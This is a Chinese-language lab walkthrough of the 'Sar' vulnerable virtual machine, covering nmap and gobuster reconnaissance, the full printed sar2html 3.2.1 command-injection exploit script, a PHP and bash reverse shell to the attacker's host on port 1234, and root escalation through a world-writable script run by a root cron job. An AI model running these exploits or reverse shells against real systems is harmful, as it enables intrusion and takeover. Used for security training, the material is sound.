# RSA:1主机渗透实现

- 靶机地址:
- 下载地址:

## 信息收集:

### 主机发现:

- 当前IP段:`192.168.2.0/24`,当前主机IP:`192.168.2.2`

- ```shell
  └─$ sudo nmap -sn --min-rate 10000 192.168.2.1/24                      
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 01:40 EDT
  Nmap scan report for 192.168.2.1
  Host is up (0.0076s latency).
  MAC Address: 00:50:56:C0:00:01 (VMware)
  Nmap scan report for 192.168.2.10
  Host is up (0.00019s latency).
  MAC Address: 00:0C:29:AE:5C:8F (VMware)
  Nmap scan report for 192.168.2.254
  Host is up (0.000077s latency).
  MAC Address: 00:50:56:E4:FB:DB (VMware)
  Nmap scan report for 192.168.2.2
  Host is up.
  Nmap done: 256 IP addresses (4 hosts up) scanned in 13.32 seconds
  ```

- 靶机IP:`192.168.2.10`

### 端口扫描

- TCP端口扫描

- ```shell
  └─$ sudo nmap -sT --min-rate 10000 -p- 192.168.2.10 -oA Nmap-scan/sT
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 01:43 EDT
  Nmap scan report for 192.168.2.10
  Host is up (0.00065s latency).
  Not shown: 65534 closed tcp ports (conn-refused)
  PORT   STATE SERVICE
  80/tcp open  http
  MAC Address: 00:0C:29:AE:5C:8F (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 9.73 seconds
  ```

- UDP端口扫描

- ```shell
  └─$ sudo nmap -sU --min-rate 10000 -p- 192.168.2.10 -oA Nmap-scan/sU    
  [sudo] password for kali: 
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 01:43 EDT
  Warning: 192.168.2.10 giving up on port because retransmission cap hit (10).
  Nmap scan report for 192.168.2.10
  Host is up (0.00073s latency).
  All 65535 scanned ports on 192.168.2.10 are in ignored states.
  Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
  MAC Address: 00:0C:29:AE:5C:8F (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 79.44 seconds
  
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/rsa]
  └─$ sudo nmap -sU --min-rate 10000 --top-port 20 192.168.2.10 -oA Nmap-scan/sU
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 01:45 EDT
  Nmap scan report for 192.168.2.10
  Host is up (0.00023s latency).
  
  PORT      STATE         SERVICE
  53/udp    open|filtered domain
  67/udp    open|filtered dhcps
  68/udp    open|filtered dhcpc
  69/udp    open|filtered tftp
  123/udp   open|filtered ntp
  135/udp   open|filtered msrpc
  137/udp   closed        netbios-ns
  138/udp   open|filtered netbios-dgm
  139/udp   open|filtered netbios-ssn
  161/udp   closed        snmp
  162/udp   open|filtered snmptrap
  445/udp   open|filtered microsoft-ds
  500/udp   open|filtered isakmp
  514/udp   open|filtered syslog
  520/udp   open|filtered route
  631/udp   open|filtered ipp
  1434/udp  closed        ms-sql-m
  1900/udp  open|filtered upnp
  4500/udp  open|filtered nat-t-ike
  49152/udp open|filtered unknown
  MAC Address: 00:0C:29:AE:5C:8F (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 6.93 second
  ```

### 服务及操作系统扫描

- ```shell
  └─$ sudo nmap -sC -sV -O -p80 192.168.2.10 -oA Nmap-scan/sC
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 01:44 EDT
  Nmap scan report for 192.168.2.10
  Host is up (0.00067s latency).
  
  PORT   STATE SERVICE VERSION
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  |_http-title: Apache2 Ubuntu Default Page: It works
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  MAC Address: 00:0C:29:AE:5C:8F (VMware)
  Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
  Aggressive OS guesses: Linux 4.15 - 5.8 (98%), Linux 5.0 - 5.5 (97%), Linux 5.0 - 5.4 (94%), Linux 5.4 (94%), Linux 2.6.32 (94%), Linux 3.2 - 4.9 (94%), Linux 2.6.32 - 3.10 (93%), Linux 5.3 - 5.4 (92%), Linux 3.4 - 3.10 (92%), Synology DiskStation Manager 5.2-5644 (92%)
  No exact OS matches for host (test conditions non-ideal).
  Network Distance: 1 hop
  
  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 21.45 seconds
  ```

### 默认脚本扫描

- ```shell
  └─$ sudo nmap --script=vuln -p80 192.168.2.10 -oA Nmap-scan/Script 
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 01:45 EDT
  Nmap scan report for 192.168.2.10
  Host is up (0.00030s latency).
  
  PORT   STATE SERVICE
  80/tcp open  http
  |_http-dombased-xss: Couldn't find any DOM based XSS.
  |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
  |_http-csrf: Couldn't find any CSRF vulnerabilities.
  | http-enum: 
  |   /robots.txt: Robots file
  |_  /phpinfo.php: Possible information file
  MAC Address: 00:0C:29:AE:5C:8F (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 33.24 seconds
  ```

## web信息收集:

### gobuster扫描

- ```shell
  └─$ sudo gobuster dir -u http://192.168.2.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster -x txt,php,sql  
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://192.168.2.10/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Extensions:              txt,php,sql
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.php                 (Status: 403) [Size: 277]
  /robots.txt           (Status: 200) [Size: 9]
  /.php                 (Status: 403) [Size: 277]
  /phpinfo.php          (Status: 200) [Size: 95387]
  /server-status        (Status: 403) [Size: 277]
  Progress: 882240 / 882244 (100.00%)
  ===============================================================
  Finished
  ===============================================================
  ```

- 查看`robots.txt`文件,发现其内容指向`sarHTML`,查找对应的poc

- ```shell
  └─$ searchsploit sar2html
  ---------------------------------------------------------------------------------- ---------------------------------
   Exploit Title                                                                    |  Path
  ---------------------------------------------------------------------------------- ---------------------------------
  sar2html 3.2.1 - 'plot' Remote Code Execution                                     | php/webapps/49344.py
  Sar2HTML 3.2.1 - Remote Command Execution                                         | php/webapps/47204.txt
  ---------------------------------------------------------------------------------- ---------------------------------
  Shellcodes: No Results
  
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/rsa]
  └─$ searchsploit sar2html -m 49344
    Exploit: Microsoft IIS 5.0 - WebDAV Remote
        URL: https://www.exploit-db.com/exploits/2
       Path: /usr/share/exploitdb/exploits/windows/remote/2.c
      Codes: OSVDB-4467, CVE-2003-0109
   Verified: True
  File Type: Unicode text, UTF-8 text
  Copied to: /home/kali/Desktop/walkthroughs/rsa/2.c
  
  
    Exploit: sar2html 3.2.1 - 'plot' Remote Code Execution
        URL: https://www.exploit-db.com/exploits/49344
       Path: /usr/share/exploitdb/exploits/php/webapps/49344.py
      Codes: N/A
   Verified: True
  File Type: Python script, ASCII text executable
  Copied to: /home/kali/Desktop/walkthroughs/rsa/49344.py
                                                               
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/rsa]
  └─$ cat 49344.py 
  # Exploit Title: sar2html 3.2.1 - 'plot' Remote Code Execution
  # Date: 27-12-2020
  # Exploit Author: Musyoka Ian
  # Vendor Homepage:https://github.com/cemtan/sar2html
  # Software Link: https://sourceforge.net/projects/sar2html/
  # Version: 3.2.1
  # Tested on: Ubuntu 18.04.1
  
  #!/usr/bin/env python3
  
  import requests
  import re
  from cmd import Cmd
  
  url = input("Enter The url => ")
  
  class Terminal(Cmd):
      prompt = "Command => "
      def default(self, args):
          exploiter(args)
  
  def exploiter(cmd):
      global url
      sess = requests.session()
      output = sess.get(f"{url}/index.php?plot=;{cmd}")
      try:
          out = re.findall("<option value=(.*?)>", output.text)
      except:
          print ("Error!!")
      for ouut in out:
          if "There is no defined host..." not in ouut:
              if "null selected" not in ouut:
                  if "selected" not in ouut:
                      print (ouut)
      print ()
  
  if __name__ == ("__main__"):
      terminal = Terminal()
      terminal.cmdloop()                                                                                                                    
  ```

### 获得初始shell

1. 本地创建反弹shell`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.2/1234 0>&1'");`
2. 使用`wget`将文件下载后重命名为`.php`文件
3. 开启本机监听,接收反弹shell

- ```shell
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/rsa]
  └─$ python3 49344.py
  Enter The url => http://192.168.2.10/sar2HTML/
  Command => whoami
  www-data
  
  Command => uname -a
  Linux sar 5.0.0-23-generic #24~18.04.1-Ubuntu SMP Mon Jul 29 16:12:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
  
  Command => sudo -l
  
  Command => wget http://192.168.2.2/remotesh.txt -O sh.php
  
  Command => ls
  LICENSE
  index.php
  sar2html
  sarDATA
  sarFILE
  sh.php
  
  Command => pwd
  /var/www/html/sar2HTML
  
  Command => vim sh.php
  
  Command => cat sh.php
  
  Command => wget http://192.168.2.2:8000/remotesh.txt -O sh.php
  
  Command => cat sh.php
  <?php
  exec("/bin/bash -c 'bash -i 
  
  Command => 
  ```

4. 成功获取反弹shell

- ```shell
  └─$ sudo nc -nvlp 1234
  [sudo] password for kali: 
  listening on [any] 1234 ...
  connect to [192.168.2.2] from (UNKNOWN) [192.168.2.10] 43600
  bash: cannot set terminal process group (832): Inappropriate ioctl for device
  bash: no job control in this shell
  www-data@sar:/var/www/html/sar2HTML$ whoami
  whoami
  www-data
  www-data@sar:/var/www/html/sar2HTML$ uname -a
  uname -a
  Linux sar 5.0.0-23-generic #24~18.04.1-Ubuntu SMP Mon Jul 29 16:12:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
  www-data@sar:/var/www/html/sar2HTML$ pa 
  pa 
  pa: command not found
  www-data@sar:/var/www/html/sar2HTML$ ip a
  ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
      link/ether 00:0c:29:ae:5c:8f brd ff:ff:ff:ff:ff:ff
      inet 192.168.2.10/24 brd 192.168.2.255 scope global dynamic noprefixroute ens33
         valid_lft 1402sec preferred_lft 1402sec
      inet6 fe80::bff5:5001:3b84:1ff1/64 scope link noprefixroute 
         valid_lft forever preferred_lft forever
  www-data@sar:/var/www/html/sar2HTML$ 
  ```

## 提权

- 获取用户`flag`

- ```shell
  www-data@sar:/var/www/html/sar2HTML$ pwd
  pwd
  /var/www/html/sar2HTML
  www-data@sar:/var/www/html/sar2HTML$ cd /ho     
  cd /home/
  www-data@sar:/home$ ls
  ls
  love
  www-data@sar:/home$ ls -lhai
  ls -lhai
  total 12K
  262146 drwxr-xr-x  3 root root 4.0K Oct 20  2019 .
       2 drwxr-xr-x 24 root root 4.0K Oct 20  2019 ..
  295199 drwxr-xr-x 17 love love 4.0K Oct 21  2019 love
  www-data@sar:/home$ cd love
  cd love
  www-data@sar:/home/love$ ls -lhai
  ls -lhai
  total 92K
  295199 drwxr-xr-x 17 love love 4.0K Oct 21  2019 .
  262146 drwxr-xr-x  3 root root 4.0K Oct 20  2019 ..
  282869 -rw-------  1 love love 3.1K Oct 21  2019 .ICEauthority
  282871 -rw-------  1 love love   48 Oct 21  2019 .bash_history
  270978 -rw-r--r--  1 love love  220 Oct 20  2019 .bash_logout
  270977 -rw-r--r--  1 love love 3.7K Oct 20  2019 .bashrc
  400690 drwx------ 13 love love 4.0K Oct 21  2019 .cache
  400783 drwx------ 13 love love 4.0K Oct 20  2019 .config
  408810 drwx------  3 root root 4.0K Oct 20  2019 .dbus
  400570 drwx------  3 love love 4.0K Oct 20  2019 .gnupg
  295196 drwx------  2 root root 4.0K Oct 20  2019 .gvfs
  400693 drwx------  3 love love 4.0K Oct 20  2019 .local
  270979 -rw-r--r--  1 love love  807 Oct 20  2019 .profile
  282936 -rw-r--r--  1 root root   66 Oct 20  2019 .selected_editor
  406263 drwx------  2 love love 4.0K Oct 20  2019 .ssh
  282870 -rw-r--r--  1 love love    0 Oct 20  2019 .sudo_as_admin_successful
  400951 drwxr-xr-x  2 love love 4.0K Oct 20  2019 Desktop
  400955 drwxr-xr-x  2 love love 4.0K Oct 20  2019 Documents
  400952 drwxr-xr-x  2 love love 4.0K Oct 20  2019 Downloads
  400956 drwxr-xr-x  2 love love 4.0K Oct 20  2019 Music
  400957 drwxr-xr-x  2 love love 4.0K Oct 21  2019 Pictures
  400954 drwxr-xr-x  2 love love 4.0K Oct 20  2019 Public
  400953 drwxr-xr-x  2 love love 4.0K Oct 20  2019 Templates
  400958 drwxr-xr-x  2 love love 4.0K Oct 20  2019 Videos
  www-data@sar:/home/love$ cd Desktop
  cd Desktop
  www-data@sar:/home/love/Desktop$ ls -lhai
  ls -lhai
  total 12K
  400951 drwxr-xr-x  2 love love 4.0K Oct 20  2019 .
  295199 drwxr-xr-x 17 love love 4.0K Oct 21  2019 ..
  406266 -rw-r--r--  1 love love   33 Oct 20  2019 user.txt
  www-data@sar:/home/love/Desktop$ cat user.txt
  cat user.txt
  427a7e47deb4a8649c7cab38df232b52
  www-data@sar:/home/love/Desktop$ 
  ```

- 查找当前系统定时任务-->有一个5分钟的定时任务,发现该定时任务具有当前`www-data`用户可写可执行权限

- ```shell
  www-data@sar:/home/love/Desktop$ cat /etc/crontab
  cat /etc/crontab
  # /etc/crontab: system-wide crontab
  # Unlike any other crontab you don't have to run the `crontab'
  # command to install the new version when you edit this file
  # and files in /etc/cron.d. These files also have username fields,
  # that none of the other crontabs do.
  
  SHELL=/bin/sh
  PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
  
  # m h dom mon dow user  command
  17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
  25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
  47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
  52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
  #
  */5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh
  www-data@sar:/home/love/Desktop$ cd /var/www/html
  cd /var/www/html
  www-data@sar:/var/www/html$ cat finally.sh
  cat finally.sh
  #!/bin/sh
  
  ./write.sh
  www-data@sar:/var/www/html$ ls -lhai
  ls -lhai
  total 40K
  406326 drwxr-xr-x 3 www-data www-data 4.0K Oct 21  2019 .
  406325 drwxr-xr-x 4 www-data www-data 4.0K Oct 21  2019 ..
  408197 -rwxr-xr-x 1 root     root       22 Oct 20  2019 finally.sh
  405623 -rw-r--r-- 1 www-data www-data  11K Oct 20  2019 index.html
  408195 -rw-r--r-- 1 www-data www-data   21 Oct 20  2019 phpinfo.php
  400981 -rw-r--r-- 1 root     root        9 Oct 21  2019 robots.txt
  405734 drwxr-xr-x 4 www-data www-data 4.0K Aug 21 20:43 sar2HTML
  408199 -rwxrwxrwx 1 www-data www-data   30 Oct 21  2019 write.sh
  www-data@sar:/var/www/html$ 
  
  ```

- 写入反弹shell到需要执行的`write.sh`文件中

- ```shell
  #!/bin/bash 
  bash -c 'bash -i >& /dev/tcp/192.168.2.2/1234 0>&1' 
  touch /tmp/gateway
  ```

- 获取root用户flag

- ```shell
  └─$ nc -nvlp 1234             
  listening on [any] 1234 ...
  connect to [192.168.2.2] from (UNKNOWN) [192.168.2.10] 43756
  bash: cannot set terminal process group (18465): Inappropriate ioctl for device
  bash: no job control in this shell
  root@sar:/var/www/html# cat write.sh
  cat write.sh
  
  #!/bin/bash 
  bash -c 'bash -i >& /dev/tcp/192.168.2.2/1234 0>&1' 
  touch /tmp/gateway
  root@sar:/var/www/html# whoami
  whoami
  root
  root@sar:/var/www/html# ip a
  ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
      link/ether 00:0c:29:ae:5c:8f brd ff:ff:ff:ff:ff:ff
      inet 192.168.2.10/24 brd 192.168.2.255 scope global dynamic noprefixroute ens33
         valid_lft 1007sec preferred_lft 1007sec
      inet6 fe80::bff5:5001:3b84:1ff1/64 scope link noprefixroute 
         valid_lft forever preferred_lft forever
  root@sar:/var/www/html# uname -a
  uname -a
  Linux sar 5.0.0-23-generic #24~18.04.1-Ubuntu SMP Mon Jul 29 16:12:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
  root@sar:/var/www/html# cd /root
  cd /root
  root@sar:~# ls -lhai
  ls -lhai
  total 40K
  262148 drwx------  5 root root 4.0K Aug 21 19:09 .
       2 drwxr-xr-x 24 root root 4.0K Oct 20  2019 ..
  282868 -rw-------  1 root root  501 Oct 21  2019 .bash_history
  262347 -rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
  262346 drwx------  2 root root 4.0K Aug  6  2019 .cache
  295202 drwx------  3 root root 4.0K Oct 20  2019 .gnupg
  295197 drwxr-xr-x  3 root root 4.0K Oct 20  2019 .local
  262348 -rw-r--r--  1 root root  148 Aug 17  2015 .profile
  282877 -rw-r--r--  1 root root   33 Oct 20  2019 root.txt
  262149 -rw-r-----  1 root root    6 Aug 21 21:36 .vboxclient-display-svga.pid
  root@sar:~# cat root.txt
  cat root.txt
  66f93d6b2ca96c9ad78a8a9ba0008e99
  root@sar:~# 
  ```